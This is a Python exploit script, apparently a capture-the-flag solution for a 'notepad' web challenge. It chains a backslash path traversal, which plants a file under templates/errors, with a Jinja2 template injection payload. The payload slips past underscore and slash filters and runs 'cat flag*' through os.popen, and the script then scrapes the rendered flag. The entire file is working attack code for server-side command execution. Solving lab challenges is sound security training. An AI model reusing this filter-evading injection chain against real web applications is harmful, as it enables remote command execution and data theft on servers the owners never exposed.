import sys, requests, re, html as H
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})

tpl = ("{%set u=(config|string)[74]%}"
       "{%print(config|attr(u*2+'class'+u*2)|attr(u*2+'init'+u*2)|attr(u*2+'globals'+u*2)"
       "|attr('get')('os')|attr('popen')('cat flag*')|attr('read')())%}")
content = "\\..\\templates\\errors\\z" + tpl
assert "_" not in content and "/" not in content
print("len:", len(content))
r = S.post(BASE + "/new", data={"content": content}, timeout=25, verify=False, allow_redirects=False)
loc = r.headers.get("Location", "")
m = re.search(r"/static/(.+?)\.html$", loc)
if not m:
    print("POST echec:", loc[:200])
    sys.exit(1)
name = m.group(1).split("/")[-1]
print("nom:", name[:100])
rr = S.get(BASE + "/", params={"error": name}, timeout=25, verify=False)
txt = H.unescape(rr.text)
after = txt.split("</h3>", 1)[-1].split("<h2>")[0]
print("=== RENDU ===")
print(after.strip()[:800])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", after)
print("\nFLAG:", f.group(0) if f else "non trouve")
